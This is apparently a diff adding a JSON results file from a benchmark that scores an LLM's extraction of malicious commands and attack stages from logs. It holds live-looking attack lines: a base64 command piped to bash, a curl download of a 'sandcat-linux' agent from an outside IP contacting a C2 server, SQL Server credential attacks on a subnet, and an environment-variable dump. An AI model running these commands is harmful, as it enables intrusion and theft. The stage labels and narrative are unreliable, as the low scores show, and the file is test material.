@@ -1,0 +1,86 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "sh -c which ps",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-cont --crond",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "sh -c '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'  -p \"ca8f367fc32a\" + JSON.stringify(process.env) + \"ca8f367fc32a\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c 'del /f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.txt'",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c 'del /f /q c:\\windows\\logout.jsp'",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attack starts with leveraging cron jobs and decoded base64 commands to gain an initial foothold. It proceeds to establish persistent backdoors using SQL tools and executes privileged commands through a locally installed service. Additionally, sensitive files are deleted as part of the collection phase.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 49167,
+      "completion_tokens": 2543,
+      "total_tokens": 51710,
+      "wall_clock_s": 28.773,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3333333333333333,
+      "recall": 0.42857142857142855,
+      "f1": 0.375,
+      "tp": 3,
+      "fp": 6,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.1111111111111111,
+      "recall": 0.14285714285714285,
+      "f1": 0.125,
+      "tp": 1,
+      "fp": 8,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 49167,
+      "completion_tokens": 2543,
+      "total_tokens": 51710,
+      "wall_clock_s": 28.773,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
